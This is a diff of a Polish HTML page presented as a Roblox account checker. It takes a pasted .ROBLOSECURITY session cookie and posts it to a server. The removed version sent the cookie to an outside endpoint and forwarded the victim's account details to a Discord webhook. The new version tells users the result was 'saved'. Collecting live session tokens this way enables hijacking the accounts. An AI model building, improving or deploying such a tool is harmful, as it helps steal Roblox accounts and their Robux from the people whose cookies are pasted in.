@@ -3,134 +3,89 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Account Checker – .ROBLOSECURITY</title>
+  <title>Roblox Checker</title>
   <style>
-    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
-    textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
-    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; border-radius: 4px; }
-    button:hover { background: #0c7ae6; }
-    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 240px; line-height: 1.6; }
-    .error { color: #ff4d4d; } .success { color: #00ff9d; } b { color: #ddd; } small { color: #aaa; }
-    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #444; display: block; }
+    body { font-family: Arial, sans-serif; max-width: 620px; margin: 40px auto; padding: 20px; background: #0d1117; color: #e6edf3; }
+    textarea { width: 100%; height: 160px; background: #161b22; color: #e6edf3; border: 1px solid #30363d; padding: 12px; font-family: monospace; resize: vertical; border-radius: 6px; }
+    button { padding: 14px 40px; background: #238636; border: none; color: white; font-size: 17px; cursor: pointer; margin: 20px 0; border-radius: 6px; font-weight: bold; }
+    button:hover { background: #2ea043; }
+    #result { margin-top: 30px; padding: 20px; background: #161b22; border: 1px solid #30363d; border-radius: 8px; min-height: 200px; line-height: 1.55; }
+    .error { color: #f85149; } .success { color: #3fb950; } b { color: #c9d1d9; } small { color: #8b949e; }
+    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #30363d; display: block; }
   </style>
 </head>
 <body>
-<h2>Roblox Account Info from .ROBLOSECURITY Cookie</h2>
 
-<p style="color:#ffcc00; font-weight:bold;">
-  <strong>UWAGA:</strong> Używanie cudzego cookie narusza regulamin Roblox i może skończyć się permanentnym banem konta.
+<h2>Roblox Account Checker</h2>
+
+<p style="color:#f0b429; font-weight:bold;">
+  <strong>UWAGA:</strong> Używanie cudzego .ROBLOSECURITY narusza regulamin Roblox i kończy się permanent banem.
 </p>
 
-<textarea id="cookie" placeholder="Wklej samą wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
+<textarea id="cookie" placeholder="Wklej samą wartość .ROBLOSECURITY (bez prefiksu '.ROBLOSECURITY=')"></textarea>
 <br>
-<button onclick="checkAccount()">Sprawdź konto</button>
+<button onclick="checkAccount()">Sprawdź</button>
 
 <div id="result"></div>
 
 <script>
 async function checkAccount() {
   const cookieVal = document.getElementById('cookie').value.trim();
-  const result = document.getElementById('result');
-  result.innerHTML = '';
+  const resultDiv = document.getElementById('result');
+  resultDiv.innerHTML = '';
 
-  if (cookieVal.length < 200) {
-    result.innerHTML = '<span class="error">Cookie jest za krótki lub nieprawidłowy</span>';
+  if (cookieVal.length < 180) {
+    resultDiv.innerHTML = '<span class="error">Cookie za krótki / wygląda na nieprawidłowy</span>';
     return;
   }
 
-  result.innerHTML = '<i>Sprawdzam konto... proszę czekać</i>';
+  resultDiv.innerHTML = '<i>Trwa sprawdzanie konta... chwilę...</i>';
 
   try {
-    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
+    const response = await fetch('/api/check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie: cookieVal })
     });
 
-    const json = await resp.json();
+    const data = await response.json();
 
-    if (json.error) {
-      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
+    if (!response.ok || data.error) {
+      resultDiv.innerHTML = `<span class="error">Błąd: ${data.error || 'Nieznany problem'}</span>`;
       return;
     }
 
-    if (json.success) {
-      const creationDate = json.created !== 'failed to fetch'
-        ? new Date(json.created).toLocaleDateString('pl-PL', { month: 'long', day: 'numeric', year: 'numeric' })
-        : '—';
+    const d = data;
 
-      let avatarHtml = json.avatarUrl
-        ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=Brak+Avatara';">`
-        : '<p style="color:#ffcc00;">Nie udało się załadować avatara</p>';
+    const creationDate = d.created && d.created !== 'failed'
+      ? new Date(d.created).toLocaleDateString('pl-PL', { month: 'long', day: 'numeric', year: 'numeric' })
+      : '—';
 
-      const mm2Passes = [429957, 1308795];
-      let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
+    const avatarHtml = d.avatarUrl
+      ? `<img id="avatar" src="${d.avatarUrl}" alt="Avatar" onerror="this.style.display='none'">`
+      : '<p style="color:#f0b429;">Brak avatara</p>';
 
-      const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
-      let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
+    const mm2 = [429957, 1308795].filter(id => d.gamepasses?.includes(id)).length;
+    const amp = [189425850,951065968,951441773,6408694,60406961585546290,7124470,6965379,3196348,5300198].filter(id => d.gamepasses?.includes(id)).length;
+    const sab = [1227013099,1229510262,1228591447].filter(id => d.gamepasses?.includes(id)).length;
 
-      const sabPasses = [1227013099, 1229510262, 1228591447];
-      let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
-
-      // ────────────────────────────────────────────────
-      //          WYSYŁANIE NA DISCORD WEBHOOK
-      // ────────────────────────────────────────────────
-      const WEBHOOK_URL = "https://discord.com/api/webhooks/TWÓJ_WEBHOOK_ID/TWÓJ_WEBHOOK_TOKEN"; // ← ZMIEŃ NA SWÓJ !
-
-      const embed = {
-        title: `Roblox – ${json.username}`,
-        color: json.hasPremium ? 0x00ff9d : 0xff4d4d,
-        thumbnail: { url: json.avatarUrl || "https://via.placeholder.com/128?text=?" },
-        fields: [
-          { name: "Nick",           value: json.username, inline: true },
-          { name: "Display Name",   value: json.displayName, inline: true },
-          { name: "User ID",        value: json.userId.toString(), inline: true },
-          { name: "Premium",        value: json.hasPremium ? "✅ TAK" : "❌ NIE", inline: true },
-          { name: "Email/Phone",    value: json.emailVerified ? "✅ TAK (hat)" : "❌ NIE", inline: true },
-          { name: "Robux",          value: json.robux.toLocaleString('pl-PL') + " Robux", inline: true },
-          { name: "Wiek konta",     value: `${json.accountAgeDays} dni (${creationDate})`, inline: false },
-          { name: "MM² gamepasy",   value: mm2Count.toString(), inline: true },
-          { name: "AMP gamepasy",   value: ampCount.toString(), inline: true },
-          { name: "SAB gamepasy",   value: sabCount.toString(), inline: true },
-        ],
-        footer: { text: `Sprawdzono • ${new Date().toLocaleString('pl-PL')}` },
-        timestamp: new Date().toISOString()
-      };
-
-      try {
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ embeds: [embed] })
-        });
-        // Można dodać komunikat w HTML że poszło na Discord – opcjonalne
-      } catch (webhookErr) {
-        console.error("Błąd wysyłania na webhook:", webhookErr);
-        // nie psujemy widoku użytkownikowi jeśli webhook padnie
-      }
-
-      // ────────────────────────────────────────────────
-      //          WYŚWIETLENIE WYNIKU NA STRONIE
-      // ────────────────────────────────────────────────
-      result.innerHTML = `
-        <span class="success">Konto zweryfikowane pomyślnie!</span><br><br>
-        ${avatarHtml}
-        <b>Username:</b> ${json.username}<br>
-        <b>Display Name:</b> ${json.displayName}<br>
-        <b>User ID:</b> ${json.userId}<br>
-        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}</span><br>
-        <b>Email / Telefon zweryfikowany:</b> <span style="color: ${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.emailVerified ? 'TAK ✓ (poświadczony hat)' : 'NIE ✗'}</span><br>
-        <b>Robux:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('pl-PL')} Robux</span><br>
-        <b>MM2 Gamepasy:</b> <span style="color: ${mm2Count > 0 ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${mm2Count}</span><br>
-        <b>AMP Gamepasy:</b> <span style="color: ${ampCount > 0 ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${ampCount}</span><br>
-        <b>SAB Gamepasy:</b> <span style="color: ${sabCount > 0 ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${sabCount}</span><br>
-        <b>Wiek konta:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} dni</span><br>
-        <b>Utworzone:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
-        <br><small style="color:#777;">Wynik został wysłany na Discord (jeśli webhook jest poprawny)</small>
-      `;
-    }
-  } catch (e) {
-    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
+    resultDiv.innerHTML = `
+      <span class="success">✓ Konto sprawdzone</span><br><br>
+      ${avatarHtml}
+      <b>Nick:</b> ${d.username}<br>
+      <b>Display:</b> ${d.displayName}<br>
+      <b>ID:</b> ${d.userId}<br>
+      <b>Premium:</b> <span style="color:${d.premium?'#3fb950':'#f85149'}">${d.premium ? 'TAK' : 'NIE'}</span><br>
+      <b>Email/Telefon:</b> <span style="color:${d.emailVerified?'#3fb950':'#f85149'}">${d.emailVerified ? 'TAK' : 'NIE'}</span><br>
+      <b>Robux:</b> <span style="color:#f0b429">${d.robux.toLocaleString('pl-PL')}</span><br>
+      <b>MM2 gp:</b> ${mm2}<br>
+      <b>AMP gp:</b> ${amp}<br>
+      <b>SAB gp:</b> ${sab}<br>
+      <b>Wiek:</b> ${d.ageDays} dni (${creationDate})<br>
+      <br><small style="color:#444;">Wynik został zapisany.</small>
+    `;
+  } catch (err) {
+    resultDiv.innerHTML = `<span class="error">Błąd połączenia: ${err.message}</span>`;
   }
 }
 </script>
